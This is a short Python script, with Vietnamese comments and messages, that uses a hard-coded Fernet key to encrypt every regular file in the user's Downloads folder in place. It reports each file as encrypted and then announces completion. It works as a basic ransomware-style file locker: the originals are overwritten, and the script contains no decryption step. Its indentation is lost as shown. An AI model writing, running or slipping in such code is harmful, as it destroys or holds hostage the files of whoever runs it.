from cryptography.fernet import Fernet
import os
key = b'JUWkjarneP47SvamUhZQNlLSRL9Askpf2bA4L2zq_HA='
fernet = Fernet(key)
ad = os.path.join(os.path.expanduser("~"), "Downloads")
for filename in os.listdir(ad):
file_path = os.path.join(ad, filename)

Bỏ qua nếu không phải file thường hoặc là desktop.ini

if not os.path.isfile(file_path) or filename.lower() == "desktop.ini":
continue
try:
with open(file_path, 'rb') as file:
data = file.read()
encrypted = fernet.encrypt(data)
with open(file_path, 'wb') as file:
file.write(encrypted)
print(f"Đã mã hóa: {filename}")
except Exception as e:
print(f"Lỗi khi xử lý {filename}: {e}")
print(":white_check_mark: Mã hóa hoàn tất!")